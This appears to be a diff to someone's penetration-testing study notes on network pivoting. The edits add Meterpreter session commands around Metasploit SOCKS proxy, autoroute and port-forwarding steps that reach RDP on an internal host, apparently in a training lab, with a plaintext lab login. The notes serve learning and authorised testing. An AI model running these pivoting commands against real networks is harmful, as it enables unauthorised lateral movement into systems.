@@ -1098,6 +1098,7 @@ OR for windows powershell
 #  **IF firewall blocks ping (ICMP) **
 # In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
 # Configuring MSF's SOCKS Proxy
+	-> meterpreter > bg
 	-> use auxiliary/server/socks_proxy
 	-> set SRVPORT 9050
 	-> set SRVHOST 0.0.0.0
@@ -1118,6 +1119,7 @@ msf6 > use post/multi/manage/autoroute
 > run
 
 # It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
+meterpreter > sessions -i 1
 meterpreter > run autoroute -s 172.16.5.0/23
 
 # Listing Active Routes with AutoRoute (After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
@@ -1135,7 +1137,7 @@ meterpreter > help portfwd
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 
 # Connecting to Windows Target through localhost
-xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+xfreerdp /v:localhost_OR_IP_ofYOurIPtunneling:3300 /u:victor /p:pass@123
 
 netstat -antp
 
